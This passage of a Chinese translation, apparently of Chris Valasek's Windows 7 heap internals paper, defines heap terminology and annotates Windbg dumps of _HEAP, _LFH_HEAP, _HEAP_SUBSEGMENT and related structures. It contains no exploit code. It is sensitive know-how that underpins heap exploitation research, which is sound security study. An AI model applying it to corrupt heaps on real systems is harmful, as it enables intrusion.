Type Viewer</code>和<code>Windbg</code>从<code>Microsoft Symbol Server</code>中下载的库中获得的。</p><p>&emsp;&emsp;为了简洁起见，已对该代码的<code>伪代码</code>表示进行了<code>大量修改</code>，以便将精力集中在最常用的<code>堆管理算法</code>上。如果您觉得我<code>遗漏了一些东西</code>或<code>对代码有错误的理解</code>，请通过<code>cvalasek@gmail.com</code>与我联系。我会给你奖金。</p><h3 id="Terminology-术语"><a href="#Terminology-术语" class="headerlink" title="Terminology(术语)"></a>Terminology(术语)</h3><p>&emsp;&emsp;关于<code>Windows堆</code>的文章很多，不幸的是，我在资料中看到了很多<code>不同的术语</code>。尽管<code>本文中使用的术语</code>可能与<code>其他人</code>的也不同，但为了在<code>本文档</code>中保持一致，我现在要对其<code>进行定义</code>。</p><p>&emsp;&emsp;术语 <strong><code>“block”</code></strong> 或 <strong><code>“blocks”</code></strong> 表示<code>8字节的连续内存</code>。这是堆块(heap chunk)头在<code>引用大小</code>时使用的<code>度量单位</code>。<strong><code>“chunk”</code></strong> 是一块<code>连续的内存</code>，可以以<code>“blocks”</code>或<code>“bytes”</code>为单位进行度量。</p><p>&emsp;&emsp;<strong><code>“HeapBase”</code></strong> 是Windows调试符号所定义的<code>“_HEAP”</code>结构的<code>指针的别名</code>。在本文中，<code>“objects”</code>都会按<code>“HeapBase”</code>起始的<code>某个偏移量</code>进行定义。同时，<code>“低碎片堆(Low Fragmentation Heap)”</code>将缩写为 <strong><code>“LFH”</code></strong>。</p><p>&emsp;&emsp;<strong><code>“BlocksIndex”</code></strong> 是<code>“_HEAP_LIST_LOOKUP”</code>结构的别名。这两个术语可以<code>相互替代</code>。<code>“BlocksIndex”</code>结构体通过<code>Lists</code>来管理<code>“chunks”</code>,管理<code>0x400(1024)字节</code>及以下的<code>“chunks”</code>的<code>Lists</code>被称为 <strong><code>1st BlocksIndex</code></strong> ，而管理<code>0x400-0x4000(16k)字节</code>的<code>“chunks”</code>的<code>Lists</code>被称为 <strong><code>2nd BlocksIndex</code></strong>。大于<code>16k</code>且在<code>DeCommitThreshold</code>和<code>0xFE00“blocks”</code>(VirtualMemoryThreshold)以下的<code>“chunks”</code>将以类似于 <strong><code>FreeList[0]</code></strong> 的结构进行管理(本文稍后讨论)。</p><p>&emsp;&emsp;<code>专用“FreeLists”</code>的概念已经消失。术语 <strong><code>“ListHint”</code></strong> 或 <strong><code>“FreeList”</code></strong> 用来表示指向<code>Heap-&gt;FreeLists</code>链表中<code>特定位置</code>的一个<code>链表</code>。这将在本文的<code>“Architecture(架构)”</code>部分进行展开。</p><p>&emsp;&emsp;最后，当指代从<code>“低碎片堆(Low Fragmentation Heap)”</code>分配<code>特定大小的内存</code>时，将使用术语 <strong><code>“HeapBin”</code></strong>，<strong><code>“Bin”</code></strong> 或 <strong><code>“UserBlock”</code></strong>。我知道大多数人都将其称为<code>“HeapBucket”</code>，但是为了<code>避免造成混淆</code>，我将避免这样做，这是为了避免与微软调试符号<code>“_HEAP_BUCKET”</code>产生混淆，<code>“_HEAP_BUCKET”</code>是一个<code>0x4字节</code>的数据结构，用来指定一个<code>大小</code>而不是用于<code>内存容器</code>。</p><h3 id="Notes-说明"><a href="#Notes-说明" class="headerlink" title="Notes(说明)"></a>Notes(说明)</h3><p>&emsp;&emsp;本文旨在作为<code>John McDonald和我</code>为<code>Blackhat USA 2009</code>完成的工作的<code>后续知识</code>。有关<code>双链表</code>,<code>Lookaside链表</code>等结构的<code>内部工作原理</code>的知识，请参见标题为 <strong><code>“Practical Windows XP/2003 Exploitation”</code></strong> 的论文。(John McDonald/Chris Valasek 2009)</p><h2 id="Data-Structures-数据结构"><a href="#Data-Structures-数据结构" class="headerlink" title="Data Structures(数据结构)"></a>Data Structures(数据结构)</h2><p>&emsp;&emsp;这些<code>数据结构</code>源自版本为<code>6.1.7600.16385(SP0)</code>的<code>ntdll.dll</code>的<code>Windows调试符号</code>。它们在<code>堆管理器</code>中被用于<code>跟踪内存</code>，从而通过<code>抽象的函数调用</code>为用户提供对<code>虚拟内存</code>的无缝访问。主要是<code>HeapAlloc()</code>，<code>HeapFree()</code>，<code>malloc()</code>和<code>free()</code>。</p><h3 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h3><p><strong><code>_HEAP</code></strong>(<code>HeapBase</code>)</p><p>&emsp;&emsp;<code>每个创建的堆</code>都以一个称为<code>“HeapBase”</code>的必要结构开始。<code>“HeapBase”</code>包含<code>堆管理器</code>所用到的多个<code>重要的值</code>和<code>结构体指针</code>。这是每个<code>堆的心脏</code>，为了提供可靠的<code>分配和释放</code>操作，必须保持其<code>结构的完整性</code>。如果您熟悉<code>Windows XP</code>代码库中使用的<code>“HeapBase”</code>，这将看起来<code>非常相似</code>。但其中某些<code>加粗的字段</code>仍需要进一步解释。下面显示了<code>32位Windows 7 Service Pack 0</code>中<code>“_HEAP”</code>结构的内容：</p><p style="text-align:center;font-weight:bold">Listing 1. _HEAP via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; <span class="built_in">dt</span> _HEAP</span><br><span class="line">ntdll!_HEAP</span><br><span class="line">    +<span class="number">0x000</span> Entry : _HEAP_ENTRY                              <span class="comment">; 用于存放管理结构的堆块结构</span></span><br><span class="line">    +<span class="number">0x008</span> SegmentSignature : Uint4B                        <span class="comment">; 段签名，固定为0xffeeffee</span></span><br><span class="line">    +<span class="number">0x00c</span> SegmentFlags : Uint4B                            <span class="comment">; 段标志</span></span><br><span class="line">    +<span class="number">0x010</span> SegmentListEntry : _LIST_ENTRY                   <span class="comment">; </span></span><br><span class="line">    +<span class="number">0x018</span> Heap : Ptr32 _HEAP                               <span class="comment">; _HEAP结构指针，表明此_HEAP属于哪个堆</span></span><br><span class="line">    +<span class="number">0x01c</span> BaseAddress : Ptr32 Void                         <span class="comment">; 此堆的基地址</span></span><br><span class="line">    +<span class="number">0x020</span> NumberOfPages : Uint4B                           <span class="comment">; 此堆中的页数量，页面大小为4k</span></span><br><span class="line">    +<span class="number">0x024</span> FirstEntry : Ptr32 _HEAP_ENTRY                   <span class="comment">; Segment0的第一个_HEAP_ENTRY结构指针</span></span><br><span class="line">    +<span class="number">0x028</span> LastValidEntry : Ptr32 _HEAP_ENTRY               <span class="comment">; Segment0的最后一个_HEAP_ENTRY结构指针</span></span><br><span class="line">    +<span class="number">0x02c</span> NumberOfUnCommittedPages : Uint4B                <span class="comment">; 未提交的页数量</span></span><br><span class="line">    +<span class="number">0x030</span> NumberOfUnCommittedRanges : Uint4B               <span class="comment">; 未提交的范围数量</span></span><br><span class="line">    +<span class="number">0x034</span> SegmentAllocatorBackTraceIndex : Uint2B          <span class="comment">;</span></span><br><span class="line">    +<span class="number">0x036</span> Reserved : Uint2B                                <span class="comment">; 保留</span></span><br><span class="line">    +<span class="number">0x038</span> UCRSegmentList : _LIST_ENTRY                     <span class="comment">; UCR=UnCommitedRange</span></span><br><span class="line">    +<span class="number">0x040</span> Flags : Uint4B                                   <span class="comment">; 堆标志，2代表HEAP_GROWABLE</span></span><br><span class="line">    +<span class="number">0x044</span> ForceFlags : Uint4B                              <span class="comment">; 强制标志</span></span><br><span class="line">    +<span class="number">0x048</span> CompatibilityFlags : Uint4B                      <span class="comment">; 兼容性标志，与LFH激活有关的是0x20000000</span></span><br><span class="line">    +<span class="number">0x04c</span> EncodeFlagMask : Uint4B                          <span class="comment">;&lt;----</span></span><br><span class="line">    +<span class="number">0x050</span> Encoding : _HEAP_ENTRY                           <span class="comment">;&lt;----</span></span><br><span class="line">    +<span class="number">0x058</span> PointerKey : Uint4B                              <span class="comment">; </span></span><br><span class="line">    +<span class="number">0x05c</span> Interceptor : Uint4B                             <span class="comment">; </span></span><br><span class="line">    +<span class="number">0x060</span> VirtualMemoryThreshold : Uint4B                  <span class="comment">; 最大堆块大小(以分配粒度为单位)，可以在段中分配的堆块最大值，以用户数据区的大小来衡量</span></span><br><span class="line">    +<span class="number">0x064</span> Signature : Uint4B                               <span class="comment">; _HEAP结构的签名，固定为0xeeffeeff</span></span><br><span class="line">    +<span class="number">0x068</span> SegmentReserve : Uint4B                          <span class="comment">; 段的保留空间大小(以字节为单位)，未设置则默认为0x100000 = 1MB</span></span><br><span class="line">    +<span class="number">0x06c</span> SegmentCommit : Uint4B                           <span class="comment">; 每次提交内存的大小(以字节为单位)，未设置则默认为0x2000 = 8KB = PAGE_SIZE*2</span></span><br><span class="line">    +<span class="number">0x070</span> DeCommitFreeBlockThreshold : Uint4B              <span class="comment">; 解除提交的单块阈值(以粒度为单位)</span></span><br><span class="line">    +<span class="number">0x074</span> DeCommitTotalFreeThreshold : Uint4B              <span class="comment">; 解除提交的总空闲空间阈值(以粒度为单位)</span></span><br><span class="line">    +<span class="number">0x078</span> TotalFreeSize : Uint4B                           <span class="comment">; 空闲空间总大小(以粒度为单位)</span></span><br><span class="line">    +<span class="number">0x07c</span> MaximumAllocationSize : Uint4B                   <span class="comment">; 可分配的最大值(以字节为单位)，MmHighestUserAddress = 0x7ffdefff</span></span><br><span class="line">    +<span class="number">0x080</span> ProcessHeapsListIndex : Uint2B                   <span class="comment">; 本堆在进程堆列表中的索引</span></span><br><span class="line">    +<span class="number">0x082</span> HeaderValidateLength : Uint2B                    <span class="comment">; 头结构的有效长度(_HEAP)</span></span><br><span class="line">    +<span class="number">0x084</span> HeaderValidateCopy : Ptr32 Void                  <span class="comment">;</span></span><br><span class="line">    +<span class="number">0x088</span> NextAvailableTagIndex : Uint2B                   <span class="comment">; 下一个可用的堆块标记索引</span></span><br><span class="line">    +<span class="number">0x08a</span> MaximumTagIndex : Uint2B                         <span class="comment">; 最大的堆块标记索引</span></span><br><span class="line">    +<span class="number">0x08c</span> TagEntries : Ptr32 _HEAP_TAG_ENTRY               <span class="comment">; 指向用于标记堆块的标记结构</span></span><br><span class="line">    +<span class="number">0x090</span> UCRList : _LIST_ENTRY                            <span class="comment">; UCR=UnCommitedRange</span></span><br><span class="line">    +<span class="number">0x098</span> AlignRound : Uint4B                              <span class="comment">;</span></span><br><span class="line">    +<span class="number">0x09c</span> AlignMask : Uint4B                               <span class="comment">; 用于地址对齐的掩码</span></span><br><span class="line">    +<span class="number">0x0a0</span> VirtualAllocdBlocks : _LIST_ENTRY                <span class="comment">; 虚拟分配的块的链表(VirtualAlloc)</span></span><br><span class="line">    +<span class="number">0x0a8</span> SegmentList : _LIST_ENTRY                        <span class="comment">; 段链表</span></span><br><span class="line">    +<span class="number">0x0b0</span> AllocatorBackTraceIndex : Uint2B                 <span class="comment">; 用于记录回溯信息</span></span><br><span class="line">    +<span class="number">0x0b4</span> NonDedicatedListLength : Uint4B                  <span class="comment">;</span></span><br><span class="line">    +<span class="number">0x0b8</span> BlocksIndex : Ptr32 Void                         <span class="comment">;&lt;----</span></span><br><span class="line">    +<span class="number">0x0bc</span> UCRIndex : Ptr32 Void                            <span class="comment">; UCR=UnCommitedRange</span></span><br><span class="line">    +<span class="number">0x0c0</span> PseudoTagEntries : Ptr32 _HEAP_PSEUDO_TAG_ENTRY  <span class="comment">;</span></span><br><span class="line">    +<span class="number">0x0c4</span> FreeLists : _LIST_ENTRY                          <span class="comment">;&lt;----</span></span><br><span class="line">    +<span class="number">0x0cc</span> LockVariable : Ptr32 _HEAP_LOCK                  <span class="comment">; 用于串行化控制的同步对象</span></span><br><span class="line">    +<span class="number">0x0d0</span> CommitRoutine : Ptr32 long                       <span class="comment">;</span></span><br><span class="line">    +<span class="number">0x0d4</span> FrontEndHeap : Ptr32 Void                        <span class="comment">;&lt;----前端堆(LFH)</span></span><br><span class="line">    +<span class="number">0x0d8</span> FrontHeapLockCount : Uint2B                      <span class="comment">; 前端堆的锁定计数</span></span><br><span class="line">    +<span class="number">0x0da</span> FrontEndHeapType : UChar                         <span class="comment">;&lt;----前端堆的类型</span></span><br><span class="line">    +<span class="number">0x0dc</span> Counters : _HEAP_COUNTERS                        <span class="comment">; </span></span><br><span class="line">    +<span class="number">0x130</span> TuningParameters : _HEAP_TUNING_PARAMETERS       <span class="comment">;</span></span><br></pre></td></tr></table></figure><ul><li><strong><code>EncodeFlagMask</code></strong> - 一个用于确定<code>堆块头(Heap Chunk Header)</code>是否<code>已编码</code>的值。该值最初由<code>RtlCreateHeap()</code>中的<code>RtlpCreateHeapEncoding()</code>设置为<code>0x100000</code>。</li><li><strong><code>Encoding</code></strong> - 在XOR操作中用于对块头(Heap Chunk Header)进行编码，以防止可预测的元数据损坏。</li><li><strong><code>BlocksIndex</code></strong> - 这是一个_HEAP_LIST_LOOKUP结构，可用于多种用途。由于其重要性，将在本文档的后面部分对此进行更详细的讨论。</li><li><strong><code>FreeLists</code></strong> - 一个特殊的链接，包含了此堆上的所有“Free Chunk”的指针。几乎可以将其视为“Heap Cache”，但是适用于各种大小的Chunks(并且没有单个关联的bitmap)。</li><li><strong><code>FrontEndHeap</code></strong> - 指向关联的前端堆(Front-End Heap)的指针。在Windows 7下，它可以为“NULL”或指向“_LFH_HEAP”结构的指针。</li><li><strong><code>FrontEndHeapType</code></strong> - 初始化设置为0x0的整型数，随后会被赋值为0x2，指示LFH被使用。注意：Windows 7实际上不支持Lookaside链表。</li></ul><h3 id="HEAP-LIST-LOOKUP"><a href="#HEAP-LIST-LOOKUP" class="headerlink" title="_HEAP_LIST_LOOKUP"></a>_HEAP_LIST_LOOKUP</h3><p><strong><code>_HEAP_LIST_LOOKUP</code></strong>(<code>HeapBase</code>-&gt;<code>BlocksIndex</code>)</p><p>&emsp;&emsp;理解_HEAP_LIST_LOOKUP结构是建立Windows 7堆管理的坚实基础的最重要任务之一。这是后端堆管理器(Back-End Manager)和前端堆管理器(Front-End Manager)使用分配和释放的基石。在正常情况下，在RtlCreateHeap()中初始化的1st _HEAP_LIST_LOOKUP结构将位于HeapBase+0x150的位置。</p><p style="text-align:center;font-weight:bold">Listing 2. _HEAP_LIST_LOOKUP via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; <span class="built_in">dt</span> _HEAP_LIST_LOOKUP</span><br><span class="line">ntdll!_HEAP_LIST_LOOKUP</span><br><span class="line">    +<span class="number">0x000</span> ExtendedLookup : Ptr32 _HEAP_LIST_LOOKUP     &lt;----</span><br><span class="line">    +<span class="number">0x004</span> ArraySize : Uint4B                           &lt;----</span><br><span class="line">    +<span class="number">0x008</span> ExtraItem : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> ItemCount : Uint4B</span><br><span class="line">    +<span class="number">0x010</span> OutOfRangeItems : Uint4B                     &lt;----</span><br><span class="line">    +<span class="number">0x014</span> BaseIndex : Uint4B                           &lt;----</span><br><span class="line">    +<span class="number">0x018</span> ListHead : Ptr32 _LIST_ENTRY                 &lt;----</span><br><span class="line">    +<span class="number">0x01c</span> ListsInUseUlong : Ptr32 Uint4B               &lt;----</span><br><span class="line">    +<span class="number">0x020</span> ListHints : Ptr32 Ptr32 _LIST_ENTRY          &lt;----</span><br></pre></td></tr></table></figure><ul><li><strong><code>ExtendedLookup</code></strong> - 指向下一个_HEAP_LIST_LOOKUP结构的指针。如果没有下一个，则该值为NULL。</li><li><strong><code>ArraySize</code></strong> - 此结构可以跟踪的最大block的大小，超出此大小的Chunk则将其存储在特殊的ListHint中。Windows 7当前唯一使用的两种大小是0x80和0x800。</li><li><strong><code>OutOfRangeItems</code></strong> - 这个4字节的值记载了类似FreeList[0]的结构中的条目数。每个_HEAP_LIST_LOOKUP会通过ListHint [ArraySize-BaseIndex-1]来跟踪大于ArraySize-1的空闲块(Free Chunks)。</li><li><strong><code>BaseIndex</code></strong> - 用于索引ListHints数组的相对偏移量，每个_HEAP_LIST_LOOKUP被设计成对应于某一个具体大小。例如，1st BlocksIndex的BaseIndex为0x0，因为它管理的Chunk的大小范围为0x0~0x80，而2nd BlocksIndex的BaseIndex为0x80。</li><li><strong><code>ListHead</code></strong> - 它与HeapBase-&gt;FreeLists指向相同的位置，该位置是一个链表，存储了堆中可用的所有的“Free Chunks”。</li><li><strong><code>ListsInUseUlong</code></strong> - 形式上作为FreeListInUseBitmap，此4字节整型数是一种优化，用于判断哪些ListHint具有可用的Chunk。</li><li><strong><code>ListHints</code></strong> - 也称为FreeLists，这些链表提供了指向Free Chunk的指针，同时还具有其他目的。如果为给定的Bucket大小启用了LFH，则特定大小的ListHint/FreeList的blink将指向_HEAP_BUCKET+1(_HEAP_BUCKET结构地址加1)。</li></ul><h3 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h3><p><strong><code>_LFH_HEAP</code></strong>(<code>HeapBase</code>-&gt;<code>FrontEndHeap</code>)</p><p>&emsp;&emsp;LFH由此数据结构管理。当LFH被激活后，它将使堆管理器知道它能够管理什么大小，同时对此前用过的Chunks保持缓存。尽管BlocksIndex能够跟踪大小超过0x800 blocks的Chunks，但是LFH仅用于小于16k的Chunks。</p><p style="text-align:center;font-weight:bold">Listing 3. _LFH_HEAP via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; <span class="built_in">dt</span> _LFH_HEAP</span><br><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">    +<span class="number">0x000</span> <span class="keyword">Lock</span> : _RTL_CRITICAL_SECTION</span><br><span class="line">    +<span class="number">0x018</span> SubSegmentZones : _LIST_ENTRY</span><br><span class="line">    +<span class="number">0x020</span> ZoneBlockSize : Uint4B</span><br><span class="line">    +<span class="number">0x024</span> Heap : Ptr32 Void                                &lt;----</span><br><span class="line">    +<span class="number">0x028</span> SegmentChange : Uint4B</span><br><span class="line">    +<span class="number">0x02c</span> SegmentCreate : Uint4B</span><br><span class="line">    +<span class="number">0x030</span> SegmentInsertInFree : Uint4B</span><br><span class="line">    +<span class="number">0x034</span> SegmentDelete : Uint4B</span><br><span class="line">    +<span class="number">0x038</span> CacheAllocs : Uint4B</span><br><span class="line">    +<span class="number">0x03c</span> CacheFrees : Uint4B</span><br><span class="line">    +<span class="number">0x040</span> SizeInCache : Uint4B</span><br><span class="line">    +<span class="number">0x048</span> RunInfo : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">    +<span class="number">0x050</span> UserBlockCache : [<span class="number">12</span>] _USER_MEMORY_CACHE_ENTRY   &lt;----</span><br><span class="line">    +<span class="number">0x110</span> Buckets : [<span class="number">128</span>] _HEAP_BUCKET                     &lt;----</span><br><span class="line">    +<span class="number">0x310</span> LocalData : [<span class="number">1</span>] _HEAP_LOCAL_DATA                 &lt;----</span><br></pre></td></tr></table></figure><ul><li><strong><code>Heap</code></strong> - 指向此LFH父堆的指针。</li><li><strong><code>UserBlockCache</code></strong> - 尽管不会进行详细讨论该字段，但值得一提的是，UserBlockCache数组会跟踪那些先前使用过的内存块，以供将来分配。</li><li><strong><code>Buckets</code></strong> - 0x4字节数据结构的数组，仅用于跟踪索引和大小。这就是为什么术语“Bin”将被用来描述满足特定Bucket请求的内存区域的原因。</li><li><strong><code>LocalData</code></strong> - 这是指向大型数据结构的指针，该数据结构保存了每个SubSegment的信息。有关更多信息，请参见_HEAP_LOCAL_DATA。</li></ul><h3 id="HEAP-LOCAL-DATA"><a href="#HEAP-LOCAL-DATA" class="headerlink" title="_HEAP_LOCAL_DATA"></a>_HEAP_LOCAL_DATA</h3><p><strong><code>_HEAP_LOCAL_DATA</code></strong>(<code>HeapBase</code>-&gt;<code>FrontEndHeap</code>-&gt;<code>LocalData</code>)</p><p>&emsp;&emsp;为LFH提供_HEAP_LOCAL_SEGMENT_INFO实例的关键结构。</p><p style="text-align:center;font-weight:bold">Listing 4. _HEAP_LOCAL_DATA via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _HEAP_LOCAL_DATA</span><br><span class="line">ntdll!_HEAP_LOCAL_DATA</span><br><span class="line">    +<span class="number">0x000</span> DeletedSubSegments : _SLIST_HEADER</span><br><span class="line">    +<span class="number">0x008</span> CrtZone : Ptr32 _LFH_BLOCK_ZONE</span><br><span class="line">    +<span class="number">0x00c</span> LowFragHeap : Ptr32 _LFH_HEAP                    &lt;----</span><br><span class="line">    +<span class="number">0x010</span> Sequence : Uint4B</span><br><span class="line">    +<span class="number">0x018</span> SegmentInfo : [<span class="number">128</span>] _HEAP_LOCAL_SEGMENT_INFO     &lt;----</span><br></pre></td></tr></table></figure><ul><li><strong><code>LowFragHeap</code></strong> - 与该结构关联的LFH。</li><li><strong><code>SegmentInfo</code></strong> - _HEAP_LOCAL_SEGMENT_INFO结构的数组，表示此LFH的所有可用大小。有关更多信息，请参见_HEAP_LOCAL_SEGMENT_INFO。</li></ul><h3 id="LFH-BLOCK-ZONE"><a href="#LFH-BLOCK-ZONE" class="headerlink" title="_LFH_BLOCK_ZONE"></a>_LFH_BLOCK_ZONE</h3><p><strong><code>_LFH_BLOCK_ZONE</code></strong>(<code>HeapBase</code>-&gt;<code>FrontEndHeap</code>-&gt;<code>LocalData</code>-&gt;<code>CrtZone</code>)</p><p>&emsp;&emsp;该数据结构用于跟踪那些用于<code>服务分配请求的内存</code>的位置。这些指针是在LFH服务第一个请求时，或者在指针列表用完之后被设置。</p><p style="text-align:center;font-weight:bold">Listing 5. _LFH_BLOCK_ZONE via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _LFH_BLOCK_ZONE</span><br><span class="line">ntdll!_LFH_BLOCK_ZONE</span><br><span class="line">    +<span class="number">0x000</span> ListEntry : _LIST_ENTRY      &lt;----</span><br><span class="line">    +<span class="number">0x008</span> FreePointer : Ptr32 Void     &lt;----</span><br><span class="line">    +<span class="number">0x00c</span> Limit : Ptr32 Void           &lt;----</span><br></pre></td></tr></table></figure><ul><li><strong><code>ListEntry</code></strong> - _LFH_BLOCK_ZONE结构的链表。</li><li><strong><code>FreePointer</code></strong> - 一个指向可以被_HEAP_SUBSEGMENT使用的内存指针。</li><li><strong><code>Limit</code></strong> - 链表中的最后一个_LFH_BLOCK_ZONE结构的指针。当达到或超过此值时，后端堆(Back-End Heap)将会创建更多的_LFH_BLOCK_ZONE结构。</li></ul><h3 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h3><p><strong><code>_HEAP_LOCAL_SEGMENT_INFO</code></strong>(<code>HeapBase</code>-&gt;<code>FrontEndHeap</code>-&gt;<code>LocalData</code>-&gt;<code>SegmentInfo[]</code>)</p><p>&emsp;&emsp;要服务的请求的大小将确定使用哪一个_HEAP_LOCAL_SEGMENT_INFO结构。该结构保存了堆算法在确定最有效的分配和释放内存的方式时使用的信息。尽管_HEAP_LOCAL_DATA中只有128个该结构，但是所有小于16k的8字节对齐的大小都具有对应的_HEAP_LOCAL_SEGMENT_INFO结构。有一种特殊的算法用于计算相对索引，从而确保每个Bucket都具有专用的结构。</p><p style="text-align:center;font-weight:bold">Listing 6. _HEAP_LOCAL_SEGMENT_INFO via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">ntdll!_HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">    +<span class="number">0x000</span> Hint : Ptr32 _HEAP_SUBSEGMENT                &lt;----</span><br><span class="line">    +<span class="number">0x004</span> ActiveSubsegment : Ptr32 _HEAP_SUBSEGMENT    &lt;----</span><br><span class="line">    +<span class="number">0x008</span> CachedItems : [<span class="number">16</span>] Ptr32 _HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x048</span> SListHeader : _SLIST_HEADER</span><br><span class="line">    +<span class="number">0x050</span> Counters : _HEAP_BUCKET_COUNTERS</span><br><span class="line">    +<span class="number">0x058</span> LocalData : Ptr32 _HEAP_LOCAL_DATA           &lt;----</span><br><span class="line">    +<span class="number">0x05c</span> LastOpSequence : Uint4B</span><br><span class="line">    +<span class="number">0x060</span> BucketIndex : Uint2B                         &lt;----</span><br><span class="line">    +<span class="number">0x062</span> LastUsed : Uint2B</span><br></pre></td></tr></table></figure><ul><li><strong><code>Hint</code></strong> - 仅当LFH释放正在管理的Chunk时，才设置此SubSegment。如果从不释放块，则该值将始终为NULL。</li><li><strong><code>ActiveSubsegment</code></strong> - 用于大多数内存请求的SubSegment。初始化为NULL，当为某个特定大小进行第一次分配时设置。</li><li><strong><code>LocalData</code></strong> - 与此结构关联的_HEAP_LOCAL_DATA结构指针。</li><li><strong><code>BucketIndex</code></strong> - 每个SegmentInfo对象都与一个具体的Bucket大小(或索引)相关。</li></ul><h3 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h3><p><strong><code>_HEAP_SUBSEGMENT</code></strong>(<code>HeapBase</code>-&gt;<code>FrontEndHeap</code>-&gt;<code>LocalData</code>-&gt;<code>SegmentInfo[]</code>-&gt;<code>Hint, ActiveSubsegment, CachedItems</code>)</p><p>&emsp;&emsp;在为特定的_HEAP_BUCKET确定适当的结构后，前端堆管理器(Front-End Manager)将执行释放或分配。由于可以将LFH视为堆管理器中的堆管理器，因此使用_HEAP_SUBSEGMENT来跟踪还有多少内存可用以及应该如何分布是有意义的。</p><p style="text-align:center;font-weight:bold">Listing 7. _HEAP_SUBSEGMENT via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _HEAP_SUBSEGMENT</span><br><span class="line">ntdll!_HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x000</span> LocalInfo : Ptr32 _HEAP_LOCAL_SEGMENT_INFO       &lt;----</span><br><span class="line">    +<span class="number">0x004</span> UserBlocks : Ptr32 _HEAP_USERDATA_HEADER         &lt;----</span><br><span class="line">    +<span class="number">0x008</span> AggregateExchg : _INTERLOCK_SEQ                  &lt;----</span><br><span class="line">    +<span class="number">0x010</span> BlockSize : Uint2B</span><br><span class="line">    +<span class="number">0x012</span> Flags : Uint2B</span><br><span class="line">    +<span class="number">0x014</span> BlockCount : Uint2B</span><br><span class="line">    +<span class="number">0x016</span> SizeIndex : UChar                                &lt;----</span><br><span class="line">    +<span class="number">0x017</span> AffinityIndex : UChar</span><br><span class="line">    +<span class="number">0x010</span> Alignment : [<span class="number">2</span>] Uint4B</span><br><span class="line">    +<span class="number">0x018</span> SFreeListEntry : _SINGLE_LIST_ENTRY</span><br><span class="line">    +<span class="number">0x01c</span> <span 